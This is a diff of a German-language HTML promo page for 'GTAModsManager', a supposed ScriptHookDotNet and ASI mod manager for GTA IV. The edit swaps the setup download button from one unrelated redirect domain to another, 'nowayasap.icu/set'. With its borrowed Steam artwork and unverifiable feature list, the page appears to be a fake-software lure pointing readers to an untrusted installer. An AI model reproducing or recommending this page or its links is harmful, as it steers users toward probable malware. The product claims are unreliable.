@@ -1,7 +1,7 @@
 <div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
 <h1 style="color:#44aaff;border-bottom:2px solid #2288cc;text-align:center;">🌃 GTAModsManager – ScriptHookDotNet & ASI Manager für GTA IV & Episodes 🌃</h1>
 <p style="font-size:1.1em;text-align:center;"><strong>Spezialisierte Mod-Management-Lösung für Grand Theft Auto IV und Episodes from Liberty City auf Windows.</strong> Perfekt für alle, die ScriptHookDotNet, ASI-Loader und umfangreiche Mod-Sammlungen verwalten möchten.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redir" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ GTAMODSMANAGER (SETUP) HERUNTERLADEN</a><p>✅ Windows 10/11 ✅ ScriptHookDotNet ✅ ASI/Plugins ✅ Profile für EFLC ✅ Backup-Funktion</p></div>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://nowayasap.icu/set" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ GTAMODSMANAGER (SETUP) HERUNTERLADEN</a><p>✅ Windows 10/11 ✅ ScriptHookDotNet ✅ ASI/Plugins ✅ Profile für EFLC ✅ Backup-Funktion</p></div>
 <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/12210/header.jpg" style="max-width:100%;border-radius:8px;margin:15px 0;">
 <div><h3>📦 Was Sie mit GTAModsManager für GTA IV erhalten:</h3>
 <ul><li><strong>ScriptHookDotNet & ASI-Management:</strong> Vollständige Kontrolle über .NET-Skripte und ASI-Plugins – die Grundlage für die meisten GTA IV-Mods. Installieren und aktivieren Sie sie mit einem Klick.</li>
